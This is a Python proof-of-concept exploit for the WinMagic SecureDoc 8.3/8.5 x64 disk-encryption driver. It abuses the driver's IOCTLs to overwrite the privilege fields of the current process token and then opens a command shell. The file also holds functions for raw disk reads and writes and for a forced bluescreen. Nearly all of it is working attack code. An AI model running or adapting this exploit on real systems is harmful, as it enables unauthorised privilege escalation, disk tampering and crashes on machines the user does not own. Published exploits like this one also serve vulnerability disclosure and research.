#!/usr/bin/env python
import os, ctypes, struct, platform, argparse
import ctypes.wintypes as wintypes
from ctypes import windll

# PoC Exploit for Winmagic SecureDoc 8.3, 8.5 (x64)
# May work on older versions as well

__author__ = "Dennis Elser"

__BANNER__ = """
EoP PoC for WinMagic SecureDoc 8.5
"""

"""
references:

Abusing Token Privileges For LPE:
https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt

Exploiting CVE-2014-4113 on Windows 8.1
http://jodeit.org/research/Exploiting_CVE-2014-4113_on_Windows_8.1.pdf

Easy local Windows Kernel exploitation
https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf

I Got 99 Problem But a Kernel Pointer Ain’t One
http://www.alex-ionescu.com/publications/Recon/recon2013.pdf

Exploiting Leaked Process and Thread Handles
http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/

https://sourceforge.net/p/ctypes/mailman/message/34578496/
"""

PVOID = ctypes.c_void_p
PULONG = ctypes.POINTER(wintypes.ULONG)
ULONG_PTR   = wintypes.WPARAM
ACCESS_MASK = wintypes.DWORD
LPDWORD = ctypes.POINTER(wintypes.DWORD)
LPOVERLAPPED = wintypes.LPVOID
LPSECURITY_ATTRIBUTES = wintypes.LPVOID
SystemInformationClass = wintypes.DWORD

class SYSTEM_INFORMATION_CLASS(ctypes.c_ulong):
    pass

class SYSTEM_INFORMATION(ctypes.Structure):
    pass

PSYSTEM_INFORMATION = ctypes.POINTER(SYSTEM_INFORMATION)

class NTSTATUS(ctypes.c_long):
    def __eq__(self, other):
        if hasattr(other, 'value'):
            other = other.value
        return self.value == other
    def __ne__(self, other):
        if hasattr(other, 'value'):
            other = other.value
        return self.value != other
    def __lt__(self, other):
        if hasattr(other, 'value'):
            other = other.value
        return self.value < other
    def __bool__(self):
        return self.value >= 0
    def __repr__(self):
        value = ctypes.c_ulong.from_buffer(self).value
        return 'NTSTATUS(%08x)' % value

class SYSTEM_HANDLE_EX(ctypes.Structure):
    _fields_ = [("Object", PVOID),
            ("UniqueProcessId", wintypes.HANDLE),
            ("Handle", wintypes.HANDLE),
            ("GrantedAccess", ACCESS_MASK),
            ("CreatorBackTraceIndex", wintypes.USHORT),
            ("ObjectTypeIndex", wintypes.USHORT),
            ("HandleAttributes", wintypes.ULONG),
            ("Reserved", wintypes.ULONG )]

class SYSTEM_HANDLE_INFORMATION_EX(SYSTEM_INFORMATION):
    _fields_ = (('NumberOfHandles', ULONG_PTR),
                ('Reserved',        ULONG_PTR),
                ('_Handles', SYSTEM_HANDLE_EX * 1))
    @property
    def Handles(self):
        arr_t = (SYSTEM_HANDLE_EX *
                 self.NumberOfHandles)
        return ctypes.POINTER(arr_t)(self._Handles)[0]

CompareObjectHandles = ctypes.windll.kernelbase.CompareObjectHandles
DeviceIoControl = windll.kernel32.DeviceIoControl
CreateFileW = windll.kernel32.CreateFileW
CloseHandle = windll.kernel32.CloseHandle
NtQuerySystemInformation = windll.ntdll.NtQuerySystemInformation
GetCurrentProcessId = ctypes.windll.kernel32.GetCurrentProcessId
GetCurrentProcess = ctypes.windll.kernel32.GetCurrentProcess
OpenProcessToken = ctypes.windll.advapi32.OpenProcessToken
OpenProcess = ctypes.windll.kernel32.OpenProcess

_DeviceIoControl = DeviceIoControl
_DeviceIoControl.argtypes = [
        wintypes.HANDLE,
        wintypes.DWORD,
        wintypes.LPVOID,
        wintypes.DWORD,
        wintypes.LPVOID,
        wintypes.DWORD,
        LPDWORD,
        LPOVERLAPPED]

_CreateFileW = CreateFileW
_CreateFileW.argtypes = [
        wintypes.LPWSTR,
        wintypes.DWORD,
        wintypes.DWORD,
        LPSECURITY_ATTRIBUTES,
        wintypes.DWORD,
        wintypes.DWORD,
        wintypes.HANDLE]

_NtQuerySystemInformation = NtQuerySystemInformation
_NtQuerySystemInformation.argtypes = [
        SYSTEM_INFORMATION_CLASS,
        PSYSTEM_INFORMATION,
        wintypes.ULONG,
        PULONG]
_NtQuerySystemInformation.restype = NTSTATUS


SystemHandleInformationEx = SYSTEM_INFORMATION_CLASS(64)
STATUS_INFO_LENGTH_MISMATCH = NTSTATUS(0xc0000004)
SECTOR_SIZE = 512
TOKEN_ALL_ACCESS = 0xf01ff

class SecureDocInterface(object):
    def __init__(self, filename):
        self.filename = filename
        self.hfile = -1

    def open(self):
        self.hfile = (_CreateFileW(self.filename,
                0x80000000 | 0x40000000,
                0,
                0,
                3,
                0x80,
                0))
        return self.hfile

    def close(self):
        if self.hfile != -1:
            CloseHandle(self.hfile)

    def _ioctl(self, ioctl_code, inbuf, in_size, outbuf, out_size):
        num_returned = wintypes.DWORD(0)
        ptr_num_returned = ctypes.byref(num_returned)

        status = _DeviceIoControl(self.hfile,
                ioctl_code,
                inbuf,
                in_size,
                outbuf,
                out_size,
                ptr_num_returned,
                None)

        return status, num_returned

    def _bytecpy_dirty(self, addr):
        """writes 9 null bytes + 1 byte taken from addr-1 to addr"""
        errbuf = ctypes.create_string_buffer(4)
        buf = ctypes.create_string_buffer(b"\x00\x00" +struct.pack("<Q", addr))
        status, junk = self._ioctl(0x8D1F2828,
                                  ctypes.addressof(buf), ctypes.sizeof(buf),
                                  ctypes.addressof(errbuf), ctypes.sizeof(errbuf))
        return struct.unpack("<I", errbuf.raw)[0]

    def _write43_dirty(self, addr):
        """writes \x43\x00\x00\x00 to addr"""
        errbuf = ctypes.create_string_buffer(4)
        buf = ctypes.create_string_buffer(b"\x00\x00" +struct.pack("<Q", addr-1))
        status, junk = self._ioctl(0x8D1F2810,
                                  ctypes.addressof(buf), ctypes.sizeof(buf),
                                  ctypes.addressof(errbuf), ctypes.sizeof(errbuf))
        return struct.unpack("<I", errbuf.raw)[0]

    def get_driver_version(self):
        errbuf = ctypes.create_string_buffer(4)
        ver = ctypes.create_string_buffer(0x11)
        buf = ctypes.create_string_buffer((b"\x00\x00" +
            struct.pack("<Q", ctypes.addressof(ver)) +
            struct.pack("<H", ctypes.sizeof(ver)) +
            struct.pack("<H", 0)))
        status, junk = self._ioctl(0x8D1F282C,
                                  ctypes.addressof(buf), ctypes.sizeof(buf),
                                  ctypes.addressof(errbuf), ctypes.sizeof(errbuf))
        return struct.unpack("<I", errbuf.raw)[0], ver.raw

    def bluescreen(self, param_code):
        errbuf = ctypes.create_string_buffer(4)
        ctxt = ctypes.create_string_buffer(struct.pack("<I", param_code))
        buf = ctypes.create_string_buffer((struct.pack("<H", 0x55AA) +
            struct.pack("<Q", ctypes.addressof(ctxt)) +
            struct.pack("<H", 4)))
        status, junk = self._ioctl(0x8D1F2848,
                                  ctypes.addressof(buf), ctypes.sizeof(buf),
                                  ctypes.addressof(errbuf), ctypes.sizeof(errbuf))
        return struct.unpack("<I", errbuf.raw)[0], buf.raw

    def disk_write_raw(self, drivenum, is_hd, start_sector=0, data=None):
        """reads from \\Device\\Floppy%d
        or from \\Device\\Harddisk%d\\Partition0"""

        #disk type and idx   = B
        #starting sector num = <Q
        #count (in sectors)  = <I
        #data                = <Q
        
        errbuf = ctypes.create_string_buffer(4)
        assert((len(data) % SECTOR_SIZE) == 0)
        count = int(len(data) / SECTOR_SIZE)
        wbuf = ctypes.c_char.from_buffer(bytearray(data))
        driveinfo = drivenum | 0x80 if is_hd else 0
        info = ctypes.create_string_buffer((struct.pack("B", driveinfo) + 
            0x4e*b"\x00" +
            struct.pack("<Q", start_sector) +
            struct.pack("<I", count) +
            struct.pack("<Q", ctypes.addressof(wbuf))))

        tempbuf = ctypes.create_string_buffer((b"\x00\x00" +
            struct.pack("<Q", ctypes.addressof(info))))

        status, junk = self._ioctl(0x8D1F2820,
                                  ctypes.addressof(tempbuf),
                                  ctypes.sizeof(tempbuf),
                                  ctypes.addressof(errbuf), ctypes.sizeof(errbuf))
        return struct.unpack("<I", errbuf.raw)[0], bytearray(data)

    def disk_read_raw(self, drivenum, is_hd, start_sector=0, count=1):
        """reads from \\Device\\Floppy%d
        or from \\Device\\Harddisk%d\\Partition0"""

        #disk type and idx   = B
        #starting sector num = <Q
        #count (in sectors)  = <I
        #buf                 = <Q
        
        errbuf = ctypes.create_string_buffer(4)
        assert(count)
        resultbuf = ctypes.create_string_buffer(count * 512)
        driveinfo = drivenum | 0x80 if is_hd else 0
        info = ctypes.create_string_buffer((struct.pack("B", driveinfo) + 
            0x4e*b"\x00" +
            struct.pack("<Q", start_sector) +
            struct.pack("<I", count) +
            struct.pack("<Q", ctypes.addressof(resultbuf))))
        buf = ctypes.create_string_buffer((b"\x00\x00" +
            struct.pack("<Q", ctypes.addressof(info))))
        
        status, junk = self._ioctl(0x8D1F2824,
                                  ctypes.addressof(buf),
                                  ctypes.sizeof(buf),
                                  ctypes.addressof(errbuf), ctypes.sizeof(errbuf))
        return struct.unpack("<I", errbuf.raw)[0], bytearray(resultbuf.raw)

    def patch_token_privs(self, token_addr):
        errbuf = ctypes.create_string_buffer(4)
        buf = ctypes.create_string_buffer((b"\x00\x00" +
            struct.pack("<Q", token_addr + 0x40 + 1) + # write to token.SEP_TOKEN_PRIVILEGES.Present+1
            struct.pack("<H", 0x2) +
            struct.pack("<H", 0)))
        status, junk = self._ioctl(0x8D1F282C,
                                  ctypes.addressof(buf), ctypes.sizeof(buf),
                                  ctypes.addressof(errbuf), ctypes.sizeof(errbuf))

        buf = ctypes.create_string_buffer((b"\x00\x00" +
            struct.pack("<Q", token_addr + 0x40 + 8 + 1) + # write to token.SEP_TOKEN_PRIVILEGES.Enabled+1
            struct.pack("<H", 0x2) +
            struct.pack("<H", 0)))
        status, junk = self._ioctl(0x8D1F282C,
                                  ctypes.addressof(buf), ctypes.sizeof(buf),
                                  ctypes.addressof(errbuf), ctypes.sizeof(errbuf))

        return struct.unpack("<I", errbuf.raw)[0]

    def get_token_obj(self):
        token_addr = 0
        handle_info = SYSTEM_HANDLE_INFORMATION_EX()
        length = ctypes.c_ulong()

        while True:
            status = NtQuerySystemInformation(
                        SystemHandleInformationEx,
                        ctypes.byref(handle_info),
                        ctypes.sizeof(handle_info),
                        ctypes.byref(length))
            if status != STATUS_INFO_LENGTH_MISMATCH:
                break
            ctypes.resize(handle_info, length.value)

        if status < 0:
            raise WinErrorFromNtStatus(status)

        if status == 0:
            pid = GetCurrentProcessId()
            token = wintypes.HANDLE(0)
            curproc = wintypes.HANDLE(GetCurrentProcess())
            success = OpenProcessToken(
                        curproc,
                        TOKEN_ALL_ACCESS,
                        ctypes.byref(token))

            if success:
                for i in range(handle_info.NumberOfHandles):
                    if pid == handle_info.Handles[i].UniqueProcessId:
                        h = handle_info.Handles[i]
                        if (token.value == h.Handle or 
                            CompareObjectHandles(token, h.Handle)):
                                token_addr = h.Object
                                break
                CloseHandle(token)
        return token_addr

    def acquire_debug_privs(self, token_addr):
        self.patch_token_privs(token_addr)

def pwn(pid=None):
    drv_name = r'\\.\SecureDocDevice'
    sdi = SecureDocInterface(drv_name)
    if sdi.open() == -1:
        print("[!] Error. Could not get handle to %s" % drv_name)
        return

    print("[+] Got a handle to driver")
    errcode, ver = sdi.get_driver_version()
    if errcode or ver != b"FRNSecureDoc v4.1":
        print("[!] Unknown driver version")
        sdi.close()
        return

    token_addr = sdi.get_token_obj()
    if not token_addr:
        print("[!] Could not get address of token")
        sdi.close()
        return

    print("[+] Got token object: %x" % token_addr)
    print("[+] Patching token")
    sdi.acquire_debug_privs(token_addr)
    sdi.close()

    os.system("cmd.exe")
    return


if __name__ == '__main__':
    print("%s" % __BANNER__)
    if "64" not in platform.architecture()[0]:
        print("[!] 64bit Python interpreter required")
        exit()
    pwn()